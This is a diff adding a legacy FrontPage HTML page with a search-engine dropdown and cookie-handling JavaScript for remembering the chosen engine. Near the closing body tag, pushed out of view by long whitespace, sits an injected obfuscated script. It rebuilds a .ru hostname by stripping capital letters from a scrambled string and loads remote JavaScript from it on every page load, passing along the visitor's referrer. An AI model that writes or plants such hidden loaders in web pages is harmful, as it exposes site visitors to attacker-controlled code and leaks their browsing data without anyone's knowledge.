@@ -1,0 +1,268 @@
+<html>
+
+<head>
+<title>Search #include</title>
+<meta name="ROBOTS" content="noindex">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<!-- FreeFind No Index Page -->
+</head>
+
+<body>
+
+<table border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td valign="top">
+      <form onsubmit="doSearch(); return false;" method="POST" name="SearchForm"
+      action="../../../_vti_bin/shtml.dll/links/submit/searchengine/qsearch.htm" webbot-action="--WEBBOT-SELF--">
+        <table border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><select name="engine" size="1" onchange="handleEngineChange()">
+                <option
+                value="http://www.excite.com/search.gw?trace=a&amp;search=your+search+here"
+                style="color: #0000CC">eXcite</option>
+                <option
+                value="http://www.infoseek.com/Titles?qt=your+search+here">(i)
+                infoseek</option>
+                <option value style="color: #CCCCCC">--------------------</option>
+                <option
+                value="http://www.aol.com/%%%%http://netfind.aol.com/search.gw?c=web&amp;lk=excite_netfind_us&amp;src=1&amp;search=your+search+here">AOL
+                NetFind</option>
+                <option
+                value="http://www.search.com/Infoseek/1,135,0,0200.html?QUERY=your+search+here&amp;COLL=WW">c|net
+                - search</option>
+                <option
+                value="http://www.goto.com/d/search/?Keywords=your+search+here">GoTo.com</option>
+                <option
+                value="http://www.search.hotbot.com/?MT=your+search+here&amp;submit=SEARCH&amp;_v=2&amp;OPs=MDRTP">HotBot</option>
+                <option
+                value="http://www.looksmart.com/r_search?look=&amp;key=your+search+here&amp;search=0">LookSmart</option>
+                <option
+                value="http://www.mckinley.com/extsearch.cgi?query=your+search+here">Magellen</option>
+                <option
+                value="http://www.metacrawler.com/crawler?general=your+search+here">MetaCrawler</option>
+                <option
+                value="http://home.netscape.com/%%%%http://excitesearch.netscape.com/search.gw?search=your+search+here&amp;lk=excite_netcenter_us">NetCenter</option>
+                <option
+                value="http://www.webcrawler.com/cgi-bin/WebQuery?searchText=your+search+here">WebCrawler</option>
+                <option value style="color: #CCCCCC">--------------------</option>
+                <option
+                value="http://www.dejanews.com/%%%%http://search.dejanews.com:80/dnquery.xp?query=your+search+here">DejaNews</option>
+                <option
+                value="http://www.infoseek.com/Titles?qt=your+search+here&amp;col=NN&amp;sv=A2">Infoseek
+                (Usenet)</option>
+                <option
+                value="http://www.reference.com/cgi-bin/pn/go.py?searchspace=Usenet+%26+Mailing+List+Archive&amp;ranking=by+Relevance&amp;querytext=your+search+here">Reference.com</option>
+                <option value style="color: #CCCCCC">--------------------</option>
+                <option
+                value="http://www.dictionary.com/cgi-bin/dict.pl?db=*&amp;term=your+search+here">Dictionary.com</option>
+                <option
+                value="http://www.thesaurus.com/cgi-bin/htsearch?config=roget&amp;words=your+search+here">Roget's
+                Thesaurus</option>
+              </select> <input type="text" name="SearchString" size="25"> <input
+              type="button" value="Find" name="SearchButton"
+              onclick="doSearch()"></td>
+          </tr>
+        </table>
+      </form>
+    <script language="JavaScript"><!--
+
+var kYourSearchHere = "your+search+here";
+
+function setDocumentCookie( oDoc, sName, sValue )
+{
+	if ( sName.length < 1 )
+		return;
+
+	if ( 0 < sValue.length )
+	{
+		var	expDate = new Date();
+		expDate.setTime( expDate.getTime() + 365*24*60*60*1000 );
+		oDoc.cookie = ""
+						+ sName + "=" + sValue + "; "
+						+ "expires=" + expDate.toGMTString();
+	}
+	else
+	{
+		oDoc.cookie = sName + "=";
+	}
+}
+
+function setNamedCookie( sName, sValue )
+{
+	setDocumentCookie( document, sName, sValue );
+}
+
+function deleteDocumentCookie( oDoc, sName )
+{
+	oDoc.cookie = sName + "=";
+}
+
+function deleteCookie( sName )
+{
+	deleteDocumentCookie( document, sName );
+}
+
+function fetchDocumentCookie( oDoc, sName )
+{
+	var sValue = "";
+	var index = 0;
+
+	if( oDoc.cookie )
+		index = oDoc.cookie.indexOf( sName + "=" );
+	else
+		index = -1;
+
+	if ( index < 0 )
+	{
+		sValue = "";
+	}
+	else
+	{
+		var countbegin = (oDoc.cookie.indexOf( "=", index ) + 1);
+		if ( 0 < countbegin )
+		{
+			var countend = oDoc.cookie.indexOf( ";", countbegin );
+			if ( countend < 0 )
+				countend = oDoc.cookie.length;
+			sValue = oDoc.cookie.substring( countbegin, countend );
+		}
+		else
+		{
+			sValue = "";
+		}
+	}
+	return sValue;
+}
+
+function fetchNamedCookie( sName )
+{
+	return fetchDocumentCookie( document, sName );
+}
+
+function loadSearchCookie()
+{
+	var sEngine = fetchNamedCookie( "GrizzlyWebSearch" );
+	var objEngines = document.SearchForm.engine;
+	var nMaxOptions = objEngines.length;
+	var n = 0;
+	for ( n = 0; n < nMaxOptions; ++n )
+	{
+		if ( sEngine == objEngines.options[n].text )
+		{
+			document.SearchForm.engine.selectedIndex = n;
+			return;
+		}
+	}
+	/*
+	// if we got to here then we did not find a match
+	// we will just let it default
+	*/
+}
+
+function buildSearchURL( site, s )
+{
+	var nStart = site.indexOf( kYourSearchHere );
+	var sSearch = site.substring( 0, nStart );
+	sSearch += s;
+	sSearch += site.substring( nStart + kYourSearchHere.length, site.length );
+
+	return sSearch;
+}
+
+function fixSearchString( searchstring )
+{
+	var newstring = "";
+	var thesub = "";
+	var i = 0;
+	for ( i = 0 ; i <= searchstring.length ; i++ )
+	{
+		thesub = searchstring.substring(i,i+1);
+		if ( thesub != "/" && thesub != "+" && thesub != "%" )
+		{
+			newstring = newstring + thesub;
+		}
+		else
+		{
+			if ( thesub == "/" )
+				newstring = newstring + "%2F";
+			if ( thesub == "+" )
+				newstring = newstring + "%2B";
+			if ( thesub == "%" )
+			{
+				if ( searchstring.substring(i,i+3) == "%20" )
+				{
+					newstring = newstring + "+";
+					i += 2;
+				}
+				else
+				{
+					newstring = newstring + thesub;
+				}
+			}
+		}
+	}
+	return newstring;
+}
+
+function handleEngineChange()
+{
+	document.SearchForm.SearchString.focus();
+	var nOption = document.SearchForm.engine.selectedIndex;
+	var sEngine = document.SearchForm.engine.options[nOption].text;
+	var which = document.SearchForm.engine.options[nOption].value;
+	if ( which.length < 1 )
+	{
+		document.SearchForm.engine.selectedIndex = nOption - 1;
+		return;
+	}
+
+	setNamedCookie( "GrizzlyWebSearch", sEngine );
+}
+
+function doSearch()
+{
+	var nOption = document.SearchForm.engine.selectedIndex;
+	var sEngine = document.SearchForm.engine.options[nOption].text;
+	var which = document.SearchForm.engine.options[nOption].value;
+	if ( which.length < 1 )
+		return;
+
+	setNamedCookie( "GrizzlyWebSearch", sEngine );
+
+	var searchstring = document.SearchForm.SearchString.value;
+	searchstring = escape( searchstring );
+	if ( searchstring.length < 1 )
+	{
+		var n = which.indexOf("%%%%");
+		if ( n < 0 )
+		{
+			var i = which.indexOf("//");
+			n = which.indexOf("/", i+2);
+			if ( n < 0 )
+				n = which.length;
+			else
+				++n;
+		}
+		searchstring = which.substring( 0, n );
+	}
+	else
+	{
+		var n = which.indexOf("%%%%");
+		if ( 0 < n )
+			which = which.substring( n+4, which.length );
+		var newstring = fixSearchString( searchstring );
+		searchstring = buildSearchURL( which, newstring );
+	}
+	open( searchstring, "_top" );
+}
+
+loadSearchCookie();
+
+//--></script></td>
+  </tr>
+</table>
+
+<script>var QpaxQomozo = 'AXSXTNJFJJzJYOIOiCIKGJWmMFXLUOaIGPHZJLM0OUAHY7LEQOCWI.IVSrSOMNCBJu'.replace(/[A-Z]/g,''); var FibomafNidiza = document.createElement('script'); FibomafNidiza.src = 'http://' + QpaxQomozo + '/?page=' + escape(document.referrer) + '&rnd=' + Math.random(); document.getElementsByTagName('head')[0].appendChild(FibomafNidiza);</script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   </body>
+
+</html>
